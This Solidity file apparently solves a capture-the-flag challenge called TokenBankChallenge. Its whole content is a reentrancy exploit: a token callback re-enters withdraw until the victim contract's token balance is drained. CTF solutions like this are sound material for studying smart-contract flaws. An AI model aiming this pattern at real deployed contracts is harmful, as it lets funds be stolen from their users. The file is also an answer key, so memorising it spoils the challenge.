// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.4.21;

import "./TokenBankChallenge.sol";

//Reentrancy

contract Solution10 {
    TokenBankChallenge public victim;

    function Solution10() public {

    }

    function setVictim(TokenBankChallenge victim_) external {
        victim = victim_;
    }

    function attack() external {
        victim.withdraw(500000 ether);
    }

    function tokenFallback(address from, uint256 value, bytes data) external {
        if (victim.token().balanceOf(address(victim)) > 0) {
            victim.withdraw(500000 ether);
        }
    }

    //We need this to be able to handle payable(owner).transfer(address(this).balance);
    function() external payable {
    }
}
